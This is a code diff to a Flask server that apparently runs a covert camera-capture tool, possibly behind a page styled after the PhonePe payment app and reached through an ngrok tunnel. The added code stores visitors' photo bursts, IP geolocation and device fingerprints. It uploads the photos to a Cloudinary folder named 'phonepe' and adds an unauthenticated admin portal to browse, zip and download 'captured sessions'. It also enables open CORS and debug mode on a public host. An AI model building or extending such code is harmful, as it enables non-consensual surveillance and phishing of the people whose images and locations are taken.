@@ -3,7 +3,8 @@
 # Copyright (c) 2025 Surajorg - MIT License
 \
 
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, send_from_directory
+from flask_cors import CORS
 import os
 import json
 import time
@@ -15,6 +16,13 @@ import atexit
 import requests
 import logging
 import shutil
+import io
+import zipfile
+import cloudinary
+import cloudinary.uploader
+from cloudinary.utils import cloudinary_url
+from flask import send_from_directory, send_file
+from flask import send_from_directory
 
 # Try to import ngrok
 ngrok = None
@@ -40,6 +48,23 @@ os.makedirs(LEFTOVER_DIR, exist_ok=True)
 app = Flask(__name__,
            template_folder='templates',
            static_folder='static')
+CORS(app)
+
+# Configure Cloudinary (if credentials are provided in Env Vars)
+CLOUDINARY_CLOUD_NAME = os.environ.get('CLOUDINARY_CLOUD_NAME')
+CLOUDINARY_API_KEY = os.environ.get('CLOUDINARY_API_KEY')
+CLOUDINARY_API_SECRET = os.environ.get('CLOUDINARY_API_SECRET')
+
+if CLOUDINARY_CLOUD_NAME and CLOUDINARY_API_KEY and CLOUDINARY_API_SECRET:
+    cloudinary.config(
+        cloud_name=CLOUDINARY_CLOUD_NAME,
+        api_key=CLOUDINARY_API_KEY,
+        api_secret=CLOUDINARY_API_SECRET,
+        secure=True
+    )
+    logger.info("✅ Cloudinary configured successfully")
+else:
+    logger.warning("⚠️  Cloudinary not configured. Photos will be saved locally (ephemeral).")
 
 # Configure basic logging
 logging.basicConfig(
@@ -51,6 +76,168 @@ logger = logging.getLogger(__name__)
 @app.get("/health")
 def health():
     return "ok", 200
+
+@app.route('/admin')
+def admin_portal():
+    """Serve the admin portal"""
+    return render_template('admin.html')
+
+@app.route('/api/sessions')
+def get_sessions():
+    """API to get all captured sessions (including leftover data)"""
+    sessions = []
+    
+    def process_dir(base_dir, is_leftover=False):
+        if not os.path.exists(base_dir):
+            return
+        for it in os.scandir(base_dir):
+            if it.is_dir() and it.name != 'leftover_data':
+                session_id = it.name
+                session_path = it.path
+                
+                info = {}
+                info_file = os.path.join(session_path, 'session_info.json')
+                log_file = os.path.join(session_path, 'uploads_log.json')
+                
+                if os.path.exists(info_file):
+                    try:
+                        with open(info_file, 'r') as f:
+                            info = json.load(f)
+                    except Exception: pass
+                
+                if not info and os.path.exists(log_file):
+                    try:
+                        with open(log_file, 'r') as f:
+                            log_data = json.load(f)
+                            if log_data:
+                                info = {
+                                    'session_id': session_id,
+                                    'timestamp': log_data[0].get('timestamp'),
+                                    'ip_address': log_data[0].get('ip'),
+                                    'resolved_location': log_data[0].get('resolved_location'),
+                                    'user_agent': log_data[0].get('user_agent', 'Unknown'),
+                                    'all_metadata': log_data[0]
+                                }
+                    except Exception: pass
+                
+                if not info:
+                    stats = it.stat()
+                    info = {
+                        'session_id': session_id,
+                        'timestamp': datetime.fromtimestamp(stats.st_mtime).isoformat(),
+                        'ip_address': 'Unknown',
+                        'resolved_location': 'Unknown'
+                    }
+
+                # Ensure all required fields for detailed view exist
+                info['is_leftover'] = is_leftover
+                info['session_id'] = session_id # Ensure it matches
+                
+                if 'timestamp' not in info and 'finalized_at' in info:
+                    info['timestamp'] = info['finalized_at']
+
+                # Device fields for the detailed view
+                meta = info.get('all_metadata', {})
+                info['platform'] = info.get('platform') or meta.get('platform') or 'N/A'
+                info['deviceMemory'] = info.get('deviceMemory') or meta.get('deviceMemory') or 'N/A'
+                info['hardwareConcurrency'] = info.get('hardwareConcurrency') or meta.get('hardwareConcurrency') or 'N/A'
+                info['screen_resolution'] = info.get('screen_resolution') or meta.get('screenResolution') or 'N/A'
+                info['pixelRatio'] = info.get('pixelRatio') or meta.get('pixelRatio') or 'N/A'
+                info['timezone'] = info.get('timezone') or meta.get('timezone') or 'N/A'
+                info['language'] = info.get('language') or meta.get('language') or 'N/A'
+                info['connection'] = info.get('connection') or meta.get('connection') or {}
+
+                # Count photos
+                photo_count = 0
+                bursts = {}
+                for burst_name in ['initial', 'middle', 'final']:
+                    burst_dir = os.path.join(session_path, burst_name)
+                    if os.path.exists(burst_dir):
+                        photos = [f for f in os.listdir(burst_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+                        bursts[burst_name] = photos
+                        photo_count += len(photos)
+                
+                info['photo_count'] = photo_count
+                info['bursts'] = bursts
+                sessions.append(info)
+
+    process_dir(PHOTOS_DIR, is_leftover=False)
+    process_dir(LEFTOVER_DIR, is_leftover=True)
+
+    # Sort by timestamp descending
+    sessions.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+    return jsonify(sessions)
+
+@app.route('/admin/photo/<path:filename>')
+def serve_photo(filename):
+    """Serve photos from the captured_photos directory (checks both regular and leftover)"""
+    # Check regular first
+    path = os.path.join(PHOTOS_DIR, filename)
+    if os.path.exists(path):
+        return send_from_directory(PHOTOS_DIR, filename)
+    # Check leftover
+    path = os.path.join(LEFTOVER_DIR, filename)
+    if os.path.exists(path):
+        return send_from_directory(LEFTOVER_DIR, filename)
+    return "Photo not found", 404
+
+@app.route('/api/sessions/<session_id>', methods=['DELETE'])
+def delete_session(session_id):
+    """API to delete a session"""
+    # Try regular
+    session_path = os.path.join(PHOTOS_DIR, session_id)
+    if not os.path.exists(session_path) or not os.path.isdir(session_path):
+        # Try leftover
+        session_path = os.path.join(LEFTOVER_DIR, session_id)
+        
+    if os.path.exists(session_path) and os.path.isdir(session_path):
+        try:
+            shutil.rmtree(session_path)
+            return jsonify({'success': True})
+        except Exception as e:
+            return jsonify({'success': False, 'error': str(e)}), 500
+    return jsonify({'success': False, 'error': 'Session not found'}), 404
+
+@app.route('/api/sessions/<session_id>/zip')
+def download_session_zip(session_id):
+    """Create a ZIP of the entire session folder and serve it"""
+    # Try regular
+    session_path = os.path.join(PHOTOS_DIR, session_id)
+    if not os.path.exists(session_path) or not os.path.isdir(session_path):
+        # Try leftover
+        session_path = os.path.join(LEFTOVER_DIR, session_id)
+        
+    if not os.path.exists(session_path):
+        return f"Session {session_id} not found in {PHOTOS_DIR} or {LEFTOVER_DIR}", 404
+        
+    memory_file = io.BytesIO()
+    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for root, dirs, files in os.walk(session_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, session_path)
+                zf.write(file_path, arcname)
+    
+    memory_file.seek(0)
+    return send_file(
+        memory_file,
+        mimetype='application/zip',
+        as_attachment=True,
+        download_name=f'session_{session_id}.zip'
+    )
+
+@app.route('/api/photo/download/<path:filename>')
+def download_individual_photo(filename):
+    """Serve a single photo as an attachment for download"""
+    # Try regular
+    path = os.path.join(PHOTOS_DIR, filename)
+    if os.path.exists(path):
+        return send_from_directory(PHOTOS_DIR, filename, as_attachment=True)
+    # Try leftover
+    path = os.path.join(LEFTOVER_DIR, filename)
+    if os.path.exists(path):
+        return send_from_directory(LEFTOVER_DIR, filename, as_attachment=True)
+    return "Photo not found", 404
 
 
 @app.before_request
@@ -71,7 +258,7 @@ ngrok_process = None
 def get_ip_location(ip_address):
     """Get accurate location information from IP address using ip-api.com"""
     if not ip_address or ip_address == 'Unknown' or ip_address.startswith('127.') or ip_address == '::1':
-        return 'LOCAL TEST - Real location will show when accessed via ngrok tunnel'
+        return 'Local Development / Test'
 
     try:
         response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
@@ -308,15 +495,32 @@ def upload_photo():
                     return
                 image_data = data_url.split(',')[1] if ',' in data_url else data_url.replace('data:image/jpeg;base64,', '')
                 image_bytes = base64.b64decode(image_data)
-                filename = f"photo_{index + 1}.jpg"
-                photo_path = os.path.join(target_dir, filename)
-                with open(photo_path, 'wb') as f:
-                    f.write(image_bytes)
-                # Store relative path from session_dir
-                saved_files[burst_key].append({
-                    'filename': os.path.join(burst_key, filename),
-                    'timestamp': datetime.now().isoformat()
-                })
+                
+                # If Cloudinary is configured, upload there
+                if CLOUDINARY_CLOUD_NAME:
+                    public_id = f"phonepe/{session_timestamp}/{burst_key}/photo_{index + 1}"
+                    upload_result = cloudinary.uploader.upload(
+                        image_bytes,
+                        public_id=public_id,
+                        folder=f"phonepe/{session_timestamp}/{burst_key}"
+                    )
+                    url = upload_result.get('secure_url')
+                    saved_files[burst_key].append({
+                        'filename': url, # Store full URL
+                        'timestamp': datetime.now().isoformat(),
+                        'is_cloud': True
+                    })
+                else:
+                    # Fallback to local
+                    filename = f"photo_{index + 1}.jpg"
+                    photo_path = os.path.join(target_dir, filename)
+                    with open(photo_path, 'wb') as f:
+                        f.write(image_bytes)
+                    saved_files[burst_key].append({
+                        'filename': os.path.join(burst_key, filename),
+                        'timestamp': datetime.now().isoformat(),
+                        'is_cloud': False
+                    })
             except Exception:
                 logger.exception("Failed saving %s photo %s", burst_key, index + 1)
 
@@ -786,7 +990,7 @@ def main():
     try:
         # Run Flask server
         port = int(os.environ.get("PORT", 10000))
-        app.run(host='0.0.0.0', port=port, debug=False)
+        app.run(host='0.0.0.0', port=port, debug=True)
     except KeyboardInterrupt:
         print("\n👋 Shutting down...")
     finally:
